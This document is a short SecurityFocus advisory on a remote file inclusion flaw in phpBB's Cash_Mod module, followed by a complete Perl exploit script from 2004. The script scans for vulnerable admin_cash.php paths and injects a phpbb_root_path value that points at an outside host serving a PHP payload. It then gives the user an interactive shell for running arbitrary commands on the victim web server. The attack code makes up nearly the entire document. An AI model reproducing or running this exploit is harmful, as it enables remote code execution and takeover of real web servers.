source: http://www.securityfocus.com/bid/11701/info

A vulnerability is reported to exist in the phpBB Cash_Mod module that may allow an attacker to include malicious PHP files containing arbitrary code to be executed on a vulnerable system.

Remote attackers could potentially exploit this issue via a vulnerable variable to include a remote malicious PHP script, which will be executed in the context of the web server hosting the vulnerable software.

#####################################################
# phpBB2.pl exploit 2004 http://securityfocus.com/bid/11701
# Spawn bash style Shell with webserver uid
# Greetz foxtwo, Zone-H
# This Script is actually under development
#####################################################

use strict;
use IO::Socket;
my $host;
my $port;
my $command;
my $url;
my @results;
my $probe;
my @U;
$U[1] = "/phpBB2/admin/admin_cash.php?setmodules=1&phpbb_root_path=http://utenti.lycos.it/z00/xpl.gif&cmd=";
$U[2] = "/forum/admin/admin_cash.php?setmodules=1&phpbb_root_path=http://utenti.lycos.it/z00/xpl.gif&cmd=";
&intro;
&scan;
&choose;
&command;
&exit;
sub intro {
&help;
&host;
&server;
sleep 3;
};
sub host {
print "\nHost or IP : ";
$host=<STDIN>;
chomp $host;
if ($host eq ""){$host="127.0.0.1"};
print "\nPort (enter to accept 80): ";
$port=<STDIN>;
chomp $port;
if ($port =~/\D/ ){$port="80"};
if ($port eq "" ) {$port = "80"};
};
sub server {
my $X;
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
$probe = "string";
my $output;
my $webserver = "something";
&connect;
for ($X=0; $X<=10; $X++){
        $output = $results[$X];
        if (defined $output){
        if ($output =~/IIS/){ $webserver = "apache" };
        };
};
if ($webserver ne "apache"){
my $choice = "y";
chomp $choice;
if ($choice =~/N/i) {&exit};
            }else{
print "\n\nOK";
        };
};
sub scan {
my $status = "not_vulnerable";
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
print "Testing string ONE and TWO";
my $loop;
my $output;
my $flag;
$command="dir";
for ($loop=1; $loop < @U; $loop++) {
$flag = "0";
$url = $U[$loop];
$probe = "scan";
&connect;
foreach $output (@results){
if ($output =~ /Directory/) {
                              $flag = "1";
                              $status = "vulnerable";
                              };
        };
if ($flag eq "0") {
}else{
     };
};
if ($status eq "not_vulnerable"){

                                };
};
sub choose {
print "\nSelect a URL (type 0 to input)";
my $choice=<STDIN>;
chomp $choice;
if ($choice > @U){ &choose };
if ($choice =~/\D/g ){ &choose };
if ($choice == 0){ &other };
$url = $U[$choice];
};
sub other {
my $other = <STDIN>;
chomp $other;
$U[0] = $other;
};
sub command {
while ($command !~/quit/i) {
print "\nHELP QUIT URL SCAN Or Command

\n[$host]\$ ";
$command = <STDIN>;
chomp $command;
if ($command =~/quit/i) { &exit };
if ($command =~/url/i) { &choose };
if ($command =~/scan/i) { &scan };
if ($command =~/help/i) { &help };
$command =~ s/\s/+/g;
$probe = "command";
if ($command !~/quit|url|scan|help/) {&connect};
};
&exit;
};
sub connect {
my $connection = IO::Socket::INET->new (
                                Proto => "tcp",
                                PeerAddr => "$host",
                                PeerPort => "$port",
                                ) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
$connection -> autoflush(1);
if ($probe =~/command|scan/){
print $connection "GET $url$command HTTP/1.1\r\nHost: $host\r\n\r\n";
}elsif ($probe =~/string/) {
print $connection "HEAD / HTTP/1.1\r\nHost: $host\r\n\r\n";
};

while ( <$connection> ) {
                        @results = <$connection>;
                         };
close $connection;
if ($probe eq "command"){ &output };
if ($probe eq "string"){ &output };
};
sub output{
print "\nOUTPUT FROM $host. \n\n";
my $display;
if ($probe eq "string") {
                        my $X;
                        for ($X=0; $X<=10; $X++) {
                        $display = $results[$X];
                        if (defined $display){print "$display";};
                        sleep 1;
                                };
                        }else{
                        foreach $display (@results){
                            print "$display";
                            sleep 1;
                                };
                          };
};
sub exit{
print "\n\n\n


 SPABAM 2004.";
print "\nspabam.da.ru spabam\@go.to";
print "\n\n\n";
exit;
};
sub help {
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
print "\n
        PHPBB2.0 - 2.0.10
        Command Execution Vulnerability by SPABAM 2004" ;
print "\n
";
print "\n phpBB2";
print "\n

note.. ORP";
print "\n";
print "\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)";
print "\n Command: SCAN URL HELP QUIT";
print "\n\n\n\n\n\n\n\n\n\n\n";
};
